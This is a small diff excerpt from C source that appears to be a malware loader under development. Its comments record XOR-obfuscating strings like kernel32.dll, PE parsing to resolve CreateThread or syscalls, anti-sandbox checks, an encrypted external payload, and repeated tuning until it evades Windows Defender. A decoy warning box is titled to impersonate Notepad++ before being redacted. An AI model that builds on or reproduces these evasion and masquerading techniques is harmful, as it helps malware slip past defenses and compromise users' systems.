@@ -397,7 +397,7 @@ void RunSecureDecode(uint8_t matrix[4][4], uint8_t k_expandedkey[176], uint8_t d
 }
 
 // Finished, Now, Utilizing an external file to parse, collect and combine the encrypted payload as a possible way to further evade
-// Finished, Now, Further XORing all strings such as logdb.txt and kernel32.dll, also incorping PE Parsing for "CreateThread" or some other API call maybe even syscalls
+// Finished, Now, Further XORing all strings such as RED.txt and kernel32.dll, also incorping PE Parsing for "CreateThread" or some other API call maybe even syscalls
 // Finished, Also added some anti Sandbox capability. Now, Lets make this into a DLL, but I will check this again, I do want to keep on checking until it finally evades Windows Defender.
 
 void sigaltring4confirmationlmaook() {
@@ -475,7 +475,7 @@ DWORD WINAPI MyCoolEntryFunction(LPVOID lpParam) {
 	MessageBoxA(NULL,
 		"Some components are still being initialized.\n"
 		"Please wait or restart REDACTED if this persists.",
-		"Notepad++",
+		"REDACTED",
 		MB_OK | MB_ICONWARNING);
 
 
